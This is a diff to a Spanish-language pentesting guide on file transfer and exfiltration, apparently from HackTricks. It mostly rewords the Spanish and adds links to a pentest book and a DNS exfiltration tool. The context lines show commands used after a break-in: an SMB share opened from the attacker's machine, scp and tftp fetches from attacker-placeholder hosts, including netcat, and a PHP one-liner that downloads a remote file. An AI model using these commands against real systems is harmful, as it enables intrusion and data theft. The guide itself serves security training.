@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-O crea un recurso compartido smb **usando samba**:
+O crear un recurso compartido smb **usando samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -175,7 +175,7 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-El atacante debe tener SSHd en funcionamiento.
+El atacante debe tener SSHd en ejecución.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
@@ -254,7 +254,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descarga un archivo con un oneliner de PHP:
+Descargar un archivo con un PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Luego, copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
